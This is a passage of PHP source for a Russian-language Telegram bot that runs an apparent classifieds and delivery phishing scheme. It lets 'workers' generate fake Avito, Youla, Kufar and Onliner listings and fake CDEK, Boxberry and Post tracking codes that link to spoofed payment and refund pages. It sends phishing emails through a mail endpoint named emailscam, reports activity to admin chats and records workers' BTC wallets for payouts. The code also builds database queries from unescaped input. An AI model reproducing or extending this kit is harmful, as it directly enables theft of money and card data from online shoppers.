                                    $link = "https://$settingsarr[emailscam]/send_2mail.php?service=CDEK&to=$mail[email]&link=https://$domains[cdek]/track?track_id=$trackd[code]";
                                    $text = "📩 <a href=\"tg://user?id=$message[from]\">Воркер</a> <b>отправил письмона почту</b> <code>$mail[email]</code>\n🈁 <b>Платформа: </b> <code>Boxberry</code>, трек <a href=\"https://$domains[boxberry]/track?track_id=$trackd[code]\">$trackd[code]</a>\n🔗<a href=\"$link\">Ссылка на ручную отправку</a>";
                                    $user_text = "✅ Письмо отправлено на почту <code>" . $mail["email"] . "</code>";
                                    break;
                                case '2':
                                    $user_text = "❌ <b>Отпрвка писем от сервиса ПЭК невозможна.</b>";
                                    break;
                                case '3':
                                    $user_text = "❌ <b>Отпрвка писем от сервиса Почта РФ невозможна.</b>";
                                    break;
                                default:
                                    $user_text = "❌ <b>Ошибка, почтовый сервис не найден.</b>";
                                    break;
                            }

                            //log
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            //-----------------------
                            file_get_contents($link);
                            mysqli_query($connection, "UPDATE `mails` SET `status` = '1' WHERE `id` = '$mail[id]'");
                            $keyboard = json_encode(Array('keyboard' => Array(Array('💀 Мой профиль', '🗃 Мои объявления'), Array('📱 Генерация объявлений', '✈️ Транспортные компании')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $user_text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));

                        } elseif ($message['text'] == '📧 Отправить') {

                            $queryl = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$mail[send_id]' AND `worker` = '$message[from]'");
                            $ad_send = mysqli_fetch_assoc($queryl);
                            mysqli_query($connection, "UPDATE `mails` SET `status` = '1' WHERE `id` = '$mail[id]'");
                            if ($ad_send['type'] == 0) {
                                $link = "https://$settingsarr[emailscam]/send_2mail.php?service=Avito&to=$mail[email]&link=https://$domains[onliner]/buy?id=$ad_send[advert_id]";
                                file_get_contents($link);
                                $text = "📩 <a href=\"tg://user?id=$message[from]\">Воркер</a> <b>отправил письмона почту</b> <code>$mail[email]</code>\n🈁 <b>Платформа: </b> <code>Avito</code>, объявление <a href=\"https://$domains[onliner]/buy?id=$ad_send[advert_id]\">$ad_send[title]</a>\n🔗  <a href=\"$link\">Ссылка на ручную отправку</a>";

                                $keyboard = json_encode(Array('keyboard' => Array(Array('💀 Мой профиль', '🗃 Мои объявления'), Array('📱 Генерация объявлений', '✈️ Транспортные компании')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
                                send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => '✅ Письмо отправлено на почту <code>' . $mail["email"] . "</code>", 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                            } elseif ($ad_send['type'] == 1) {
                                $link = "https://$settingsarr[emailscam]/send_2mail.php?service=Youla&to=$mail[email]&link=https://$domains[youla]/product/$ad_send[advert_id]/buy/delivery";
                                file_get_contents($link);
                                $text = "📩 <a href=\"tg://user?id=$message[from]\">Воркер</a> <b>отправил письмона почту</b> <code>$mail[email]</code>\n🈁 <b>Платформа: </b> <code>Youla</code>, объявление <a href=\"https://$domains[youla]/product/$ad_send[advert_id]/buy/delivery\">$ad_send[title]</a>\n🔗  <a href=\"$link\">Ссылка на ручную отправку</a>";

                                $keyboard = json_encode(Array('keyboard' => Array(Array('💀 Мой профиль', '🗃 Мои объявления'), Array('📱 Генерация объявлений', '✈️ Транспортные компании')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
                                send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => '✅ Письмо отправлено на почту <code>' . $mail["email"] . "</code>", 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                            } else {
                                $keyboard = json_encode(Array('keyboard' => Array(Array('💀 Мой профиль', '🗃 Мои объявления'), Array('📱 Генерация объявлений', '✈️ Транспортные компании')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
                                send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => 'Тип объявления не определён', 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                                $text = "📩 <a href=\"tg://user?id=$message[from]\">Воркер</a> попытался отправить письмо от неизвестного сервиса.";
                            }

                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            send($config['token'], 'sendMessage', Array('chat_id' => '808326111', 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

                        } else {
                            $keyboard = json_encode(Array('keyboard' => Array(Array('📧 Отправить письмо'), Array('⬅️ Назад')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));

                            $text = "❔ <b>Отправить письмо или нет?</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                        }
                    }
                }


                if (mysqli_num_rows($adverts) > 0) {

                    send($config['token'], 'sendMessage', Array('chat_id' => 808326111, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

                    $advert = mysqli_fetch_assoc($adverts);

                    if (empty($advert['title'])) {
                        if (preg_match("/http/", $message['text']) == FALSE AND $message['text'] != '🛍 Юла' AND $message['text'] != '🛍 Куфар' AND $message['text'] != '📦 Onliner') {
                            if (mb_strlen($message['text']) >= 5 AND mb_strlen($message['text'] <= 90)) {
                                mysqli_query($connection, "UPDATE `adverts` SET `title` = '".$connection->real_escape_string($message['text'])."' WHERE `id` = '$advert[id]'");

                                $text = "🤑 <b>Введите сумму вашего товара</b>";
                                if($advert['type'] == 2) $text = "<b>ЦЕНА УКАЗЫВАЕТСЯ В БЕЛОРУССКИХ РУБЛЯХ!</b>\n🤑 <b>Введите сумму вашего товара</b>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            } else {
                                $text = "👺 <b>Название объявления не может быть короче 5 и длинее 90 символов</b>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            }
                        } else {
                            $text = "👺 <b>Введите корректное название объявления</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        }
                    } elseif (empty($advert['price'])) {
                        if (preg_match('/^[0-9]{3,6}$/i', $message['text']) == TRUE) {
                            if ($message['text'] >= $settings['min_price'] AND $message['text'] <= $settings['max_price']) {
                                mysqli_query($connection, "UPDATE `adverts` SET `price` = '".(int)$message['text']."' WHERE `id` = '$advert[id]'");

                                $text = "🚛 <b>Укажите стомость доставки вашего товара</b>\n\n";
                                if($advert['type'] == 2) $text = "<b>ЦЕНА УКАЗЫВАЕТСЯ В БЕЛОРУССКИХ РУБЛЯХ!</b>\n🚛 <b>Укажите стомость доставки вашего товара</b>\n\n";
                                send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            } else {
                                $text = "👺 <b>Сумма товара не может быть меньше $settings[min_price] RUB и больше $settings[max_price] RUB</b>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            }
                        } else {
                            $text = "👺 <b>Сумма товара не может быть меньше $settings[min_price] RUB и больше $settings[max_price] RUB</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        }
                    } elseif ($advert['delivery'] == 0) {
                        if (is_numeric($message['text']) == TRUE) {
                            if ($message['text'] >= 0) {
                                mysqli_query($connection, "UPDATE `adverts` SET `delivery` = '".(int)$message['text']."' WHERE `id` = '$advert[id]'");

                                $text = "📷 <b>Укажите ссылку на изображение вашего товара</b>\n\n";
                                $text .= "Вы можете воспользоваться ботом для загрузки изображения со своего устройства и получения ссылки на него, бот: <b>@imgurbot_bot</b>";
                            } else {
                                $text = "👺 <b>Стоимость доставки должна быть ≥ 0</b>";
                            }
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        } else {
                            $text = "👺 <b>Введите коректную стоимость доставки</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        }
                    } elseif (empty($advert['image'])) {
                        if(preg_match('/(http|https):\/\/cache\d.youla.io\/files\/images\/.+.jpg/i', $message['text']) == TRUE OR preg_match('/(http|https):\/\/\d{1,3}.img.avito.st\/\d{3,4}x\d{3,4}\/\d+.jpg/i', $message['text']) == TRUE OR preg_match('/(http|https):\/\/i.imgur.com\/.+.jpg/i', $message['text']) == TRUE) {
                            mysqli_query($connection, "UPDATE `adverts` SET `image` = '".$connection->real_escape_string($message['text'])."', `status` = '1', `time` = '" . time() . "' WHERE `id` = '$advert[id]'");

                            $text = "📎 <b>Ваше объявление было сгенерировано</b>\n\n";
                            $text .= "ID объявления: <code>$advert[advert_id]</code>\n";
                            $text .= "Название товара: <code>$advert[title]</code>\n";
                            $text .= "Сумма товара: <code>$advert[price] руб.</code>\n";
                            $text .= "Сумма доставки: <code>$advert[delivery] руб.</code>\n";

                            if ($advert['type'] == 0) {
                                $keyboard = Array('inline_keyboard' => Array(Array(Array('text' => 'Страница оплаты', 'url' => 'https://' . $domains['onliner'] . '/buy?id=' . $advert['advert_id']), Array('text' => 'Страница возврата', 'url' => 'https://' . $domains['onliner'] . '/refund?id=' . $advert['advert_id']))));
                            } elseif ($advert['type'] == 1) {
                                $keyboard = Array('inline_keyboard' => Array(Array(Array('text' => 'Страница оплаты', 'url' => 'https://' . $domains['youla'] . '/product/' . $advert['advert_id'] . '/buy/delivery'), Array('text' => 'Страница возврата', 'url' => 'https://' . $domains['youla'] . '/refund/' . $advert['advert_id']))));
                            } elseif ($advert['type'] == 2) {
                                $keyboard = Array('inline_keyboard' => Array(Array(Array('text' => 'Страница оплаты', 'url' => 'https://' . $domains['kufar'] . '/buy?id=' . $advert['advert_id']), Array('text' => 'Страница возврата', 'url' => 'https://' . $domains['kufar'] . '/pay/refund.php?id=' . $advert['advert_id']))));
                            } else {
                                $keyboard = Array('inline_keyboard' => Array(Array()));
                            }

                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => json_encode($keyboard)));

                            $text = "📋 <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>сгенерировал своё объявление</b>\n\n";
                            $text .= "ID объявления: <code>$advert[advert_id]</code>\n";
                            $text .= "Название товара: <code>$advert[title]</code>\n";
                            $text .= "Сумма товара: <code>$advert[price] руб.</code>\n";
                            $text .= "Сумма доставки: <code>$advert[delivery] руб.</code>";

                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => json_encode($keyboard)));
                        } else {
                            $text = "👺 <b>Указана некорректная ссылка на изображение</b>\n\n";
                            $text .= "Вставьте URL на своё изображение с вашего объявления на Авито или Юле, или воспользуйтесь ботом для загрузки изображения с вашего устройства, бот: <b>@imgurbot_bot</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        }
                    }
                } elseif (mysqli_num_rows($tracks) > 0) {
                    $track = mysqli_fetch_assoc($tracks);

                    if (empty($track['sender'])) {
                        if (preg_match('/\S{2,35} \S{2,35} \S{2,35}/i', $message['text']) == TRUE AND mb_strlen($message['text']) <= 45) {
                            mysqli_query($connection, "UPDATE `trackcodes` SET `sender` = '" . ucwords($message['text']) . "' WHERE `id` = '$track[id]'");

                            $text = "🤟 <b>Введите название отправляемого товара</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        } else {
                            $text = "😤 <b>ФИО отправителя введено некорректно</b>\n\n";
                            $text .= "Пример: <i>Иванов Иван Иванович</i>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        }
                    } elseif (empty($track['product'])) {
                        if (mb_strlen($message['text']) <= 50) {
                            mysqli_query($connection, "UPDATE `trackcodes` SET `product` = '".$connection->real_escape_string($message[text])."' WHERE `id` = '$track[id]'");

                            $text = "🤟 <b>Введите имя курьера в формате Фамилия И. О. или 0, чтобы пропустить этот пункт</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        } else {
                            $text = "😤 <b>Название отправляемого товара указано некорректно</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        }
                    } elseif (empty($track['courier']) AND $track['courier'] != '0') {
                        if ((preg_match('/\S{2,35} \S{2,35} \S{2,35}/i', $message['text']) == TRUE AND mb_strlen($message['text']) <= 45) OR $message['text'] == 0) {
                            mysqli_query($connection, "UPDATE `trackcodes` SET `courier` = '".$connection->real_escape_string($message[text])."' WHERE `id` = '$track[id]'");

                            $text = "🤟 <b>Введите вес товара в граммах</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        } else {
                            $text = "😤 <b>Имя курьера введено некорректно</b>\n\n";
                            $text .= "Пример: <i>Иванов И. И. (или введите 0, чтобы пропустить этот пункт)</i>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        }
                    } elseif (empty($track['weight'])) {
                        if (preg_match('/^[0-9]+$/i', $message['text']) == TRUE) {
                            if (strlen($message['text']) >= 4) {
                                $weight = round($message['text'], -2) / 1000 . ' кг';
                            } else {
                                $weight = $message['text'] . ' гр';
                            }

                            mysqli_query($connection, "UPDATE `trackcodes` SET `weight` = '$weight' WHERE `id` = '$track[id]'");

                            $text = "🤟 <b>Укажите сумму товара с учётом доставки</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        } else {
                            $text = "😤 <b>Вес товара указан некорректно</b>\n\n";
                            $text .= "Пример: <i>1200</i>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        }
                    } elseif (empty($track['amount'])) {
                        if (preg_match('/^[0-9]{3,5}$/i', $message['text']) == TRUE) {
                            if ($message['text'] >= $settings['min_price'] AND $message['text'] <= $settings['max_price']) {
                                mysqli_query($connection, "UPDATE `trackcodes` SET `amount` = '".(int)$message['text']."' WHERE `id` = '$track[id]'");

                                $text = "🤟 <b>Укажите комплектацию товара</b>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            } else {
                                $text = "😳 <b>Сумма товара не может быть меньше</b> <code>$settings[min_price] руб.</code> <b>и больше</b> <code>$settings[max_price] руб.</code>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            }
                        } else {
                            $text = "😳 <b>Сумма товара не может быть меньше</b> <code>$settings[min_price] руб.</code> <b>и больше</b> <code>$settings[max_price] руб.</code>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        }
                    } elseif (empty($track['equipment'])) {
                        if ((mb_strlen($message['text']) <= 250 AND mb_strlen($message['text']) >= 2)) {
                            mysqli_query($connection, "UPDATE `trackcodes` SET `equipment` = '".$connection->real_escape_string($message[text])."' WHERE `id` = '$track[id]'");

                            $text = "🤟 <b>Введите ФИО получателя</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        } else {
                            $text = "😤 <b>Комплектация товара указана некорректно</b>\n\n";
                            $text .= "Пример: <i>Зарядное устройство, Инструкция</i>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        }
                    } elseif (empty($track['recipient'])) {
                        if (preg_match('/\S{2,35} \S{2,35} \S{2,35}/i', $message['text']) == TRUE AND mb_strlen($message['text']) <= 100) {
                            mysqli_query($connection, "UPDATE `trackcodes` SET `recipient` = '" . ucwords($message['text']) . "' WHERE `id` = '$track[id]'");

                            $text = "🤟 <b>Введите город получателя</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        } else {
                            $text = "😤 <b>ФИО получателя введено некорректно</b>\n\n";
                            $text .= "Пример: <i>Иванов Иван Иванович</i>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        }
                    } elseif (empty($track['city'])) {
                        if (mb_strlen($message['text']) <= 20) {
                            mysqli_query($connection, "UPDATE `trackcodes` SET `city` = '".$connection->real_escape_string($message[text])."' WHERE `id` = '$track[id]'");

                            $text = "🤟 <b>Введите город отправителя</b>\n\n";
                            $text .= "Пример: <i>Санкт-Петербург</i>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        } else {
                            $text = "😤 <b>Город получателя указан некорректно</b>\n\n";
                            $text .= "Пример: <i>Санкт-Петербург</i>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        }
                    } elseif (empty($track['from_city'])) {
                        if (mb_strlen($message['text']) <= 20) {
                            mysqli_query($connection, "UPDATE `trackcodes` SET `from_city` = '".$connection->real_escape_string($message[text])."' WHERE `id` = '$track[id]'");

                            $text = "📅 Введите примерную дату доставки\n\n";
                            $text .= "Пример: <i>" . date("d.m.Y") . "</i>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        } else {
                            $text = "😤 <b>Город отправителя указан некорректно</b>\n\n";
                            $text .= "Пример: <i>Санкт-Петербург</i>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        }
                    } elseif (empty($track['date_pick'])) {
                        if (mb_strlen($message['text']) <= 100) {
                            mysqli_query($connection, "UPDATE `trackcodes` SET `date_pick` = '".$connection->real_escape_string($message[text])."' WHERE `id` = '$track[id]'");

                            $text = "🤟 <b>Введите адрес получателя</b>\n\n";
                            $text .= "Пример: <i>197349, г. Санкт-Петербург, ул. Байконурская, д.26</i>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        } else {
                            $text = "😤 <b>Адрес получателя указан некорректно</b>\n\n";
                            $text .= "Пример: <i>197349, г. Санкт-Петербург, ул. Байконурская, д.26</i>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        }
                    } elseif (empty($track['address'])) {
                        if (mb_strlen($message['text']) <= 100) {
                            mysqli_query($connection, "UPDATE `trackcodes` SET `address` = '".$connection->real_escape_string($message[text])."' WHERE `id` = '$track[id]'");

                            $text = "📞 <b>Введите номер телефона получателя</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        } else {
                            $text = "😤 <b>Адрес получателя указан некорректно</b>\n\n";
                            $text .= "Пример: <i>197349, г. Санкт-Петербург, ул. Байконурская, д.26</i>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        }
                    } elseif (empty($track['phone'])) {
                        if (preg_match('/\+{0,1}\d{11}/i', $message['text']) == TRUE OR preg_match('/\+7 \(\d{3}\) \d{3}-\d{2}-\d{2}/i', $message['text']) == TRUE) {
                            if (preg_match('/\+7 \(\d{3}\) \d{3}-\d{2}-\d{2}/i', $message['text']) == TRUE) {
                                $edit = $message['text'];
                            } else {
                                $phone = str_replace('+', '', $message['text']);
                                $edit = '+' . substr($phone, 0, 1) . ' (' . substr($phone, 1, 3) . ') ' . substr($phone, 4, 3) . '-' . substr($phone, 7, 2) . '-' . substr($phone, 9, 2);
                            }

                            mysqli_query($connection, "UPDATE `trackcodes` SET `phone` = '$edit', `status` = '1' WHERE `id` = '$track[id]'");

                            if ($track['type'] == 0) $platform = 'Белпочта';
                            if ($track['type'] == 1) $platform = 'СДЭК';
                            if ($track['type'] == 2) $platform = 'ПЭК';
                            if ($track['type'] == 3) $platform = 'Почта РФ';

                            $text = "🎟 <b>Ваш трек-код успешно сгенерирован</b>\n\n";
                            $text .= "Трек-код: <code>$track[code]</code>\n";
                            $text .= "Платформа: <code>$platform</code>\n";
                            $text .= "Название товара: <code>$track[product]</code>\n";
                            $text .= "Сумма товара: <code>$track[amount] руб.</code>\n";
                            $text .= "Статус: <code>Ожидает оплаты</code>\n";

                            $keyboard = Array('inline_keyboard' => Array(Array()));

                            if ($track['type'] == 0) {
                                array_push($keyboard['inline_keyboard'], Array(Array('text' => '📋 Перейти на трек-код', 'url' => 'https://' . $domains['boxberry'] . '/track?track_id=' . $track['code'])));
                            } elseif ($track['type'] == 1) {
                                array_push($keyboard['inline_keyboard'], Array(Array('text' => '📋 Перейти на трек-код', 'url' => 'https://' . $domains['cdek'] . '/track?track_id=' . $track['code'])));
                            } elseif ($track['type'] == 2) {
                                array_push($keyboard['inline_keyboard'], Array(Array('text' => '📋 Перейти на трек-код', 'url' => 'https://' . $domains['pec'] . '/track?track_id=' . $track['code'])));
                            } elseif ($track['type'] == 3) {
                                array_push($keyboard['inline_keyboard'], Array(Array('text' => '📋 Перейти на трек-код', 'url' => 'https://' . $domains['pochta'] . '/track?track_id=' . $track['code'])));
                            } else {
                                $keyboard = Array('inline_keyboard' => Array(Array()));
                            }

                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => json_encode($keyboard)));


                            $text = "🎟 <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>сгенерировал трек-код</b>\n\n";
                            $text .= "Трек-код: <code>$track[code]</code>\n";
                            $text .= "Платформа: <code>$platform</code>\n";
                            $text .= "Название товара: <code>$track[product]</code>\n";
                            $text .= "Сумма товара: <code>$track[amount] руб.</code>\n";


                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => json_encode($keyboard)));
                        } else {
                            $text = "😤 <b>Номер телефона получателя указан некорректно</b>\n\n";
                            $text .= "Пример: <i>+79455553535</i>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        }
                    }
                } else {
                    $text = "❓ <b>Подсказка</b>\n\n";
                    $text .= "Чтобы сгенерировать объявления на Куфар или создать трек-код для CDEK, выберите соответствующий раздел";
                }

                if ($message['text'] == '/help') {
                    send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => showCommands(), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => showCommands(1)));
                }

                if ($user['wallet'] == -1) {
                    if (preg_match('/[A-z0-9]+/m', $message['text']) == TRUE || $message['text'] == '⬅ Назад') {
                        $keyboard = json_encode(Array('keyboard' => Array(Array('💀 Мой профиль', '🗃 Мои объявления'), Array('📱 Генерация объявлений', '✈️ Транспортные компании')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
                        if ($message['text'] == '⬅ Назад') {
                            $text = "⚠ Вы отменили изменение BTC кошелька\n";
                            mysqli_query($connection, "UPDATE `accounts` SET `wallet` = 0 WHERE `telegram` = '$message[from]'");
                        } else {
                            $text = "✅ Ваш BTC кошелек успешно изменен на: \n<code>" . $message['text'] . "</code>";
                            mysqli_query($connection, "UPDATE `accounts` SET `wallet` = '".$connection->real_escape_string($message[text])."' WHERE `telegram` = '$message[from]'");
                        }
                    } else {
                        $text = '👺 Укажите корректный BTC кошелек';
                    }
                    send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                }

                if (preg_match('/\/hide/i', $message['text']) == TRUE) {
                    if (preg_match('/\/hide \d+/i', $message['text']) == TRUE) {
                        $advert_id = mb_substr($message['text'], 6);

                        $query = mysqli_query($connection, "SELECT `worker` FROM `adverts` WHERE `advert_id` = '$advert_id' AND `status` > '0' AND `worker` = '$message[from]'");

                        if (mysqli_num_rows($query) > 0) {
                            $advert = mysqli_fetch_assoc($query);

                            if ($advert['worker'] == $message['from']) {
                                mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `advert_id` = '$advert_id' AND `worker` = '$message[from]'");

                                $text = "🚮 <b>Вы скрыли своё объявление</b> <code>$advert_id</code>\n\n";
                                $text .= "Вы сможете восстановить его, отправив боту ссылку https://avito.ru/$advert_id";
                                $keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '♻️ Восстановить', 'callback_data' => '/show/' . $advert_id . '/')))));

                                send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                                $text = "🚮 <a href=\"tg://user?id=$message[from]\">Воркер</a> <b>скрыл своё объявление</b> <code>$advert_id</code>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            } else {
                                $text = "🥴 <b>Данное объявления закреплено не за вами</b>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            }
                        } else {
                            $text = "🥴 <b>Объявление не существует или уже неактивно</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        }
                    } else {
                        $text = "❔ Используйте /hide <code>[ID объявления]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    }
                }

                if (preg_match('/^\/setimage/i', $message['text']) == TRUE) {
                    if (preg_match('/^\/setimage ([a-z0-9]{24}|\d+);.+$/i', $message['text']) == TRUE) {
                        $edit = explode(';', mb_substr($message['text'], 10));

                        if (preg_match('/(http|https):\/\/cache\d.youla.io\/files\/images\/.+.jpg/i', $edit[1]) == TRUE OR preg_match('/(http|https):\/\/\d{1,3}.img.avito.st\/\d{3,4}x\d{3,4}\/\d+.jpg/i', $edit[1]) == TRUE OR preg_match('/(http|https):\/\/i.imgur.com\/.+.jpg/i', $edit[1]) == TRUE) {
                            $query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$edit[0]'");

                            if (mysqli_num_rows($query) > 0) {
                                $advert = mysqli_fetch_assoc($query);

                                if ($advert['worker'] == $message['from']) {
                                    if ($advert['status'] > 1) {
                                        mysqli_query($connection, "UPDATE `adverts` SET `image` = '$edit[1]' WHERE `advert_id` = '$edit[0]' AND `worker` = '$message[from]' AND `status` > '0'");

                                        $text = "🖼 <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил изображение на своём объявлении</b>";
                                        $text .= "https://avito.ru/";
                                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                        $text = "🖼 <b>Вы изменили изображение на своём объявлении</b>";
                                    } else {
                                        $text = "🔑 <b>Объявление скрыто или ещё находится в обработке</b>";
                                    }
                                } else {
                                    $text = "🔑 <b>Объявление закреплено за другим воркеров</b>";
                                }
                            } else {
                                $text = "🧐 <b>Объявление с таким ID не было найдено</b>";
                            }
                        } else {
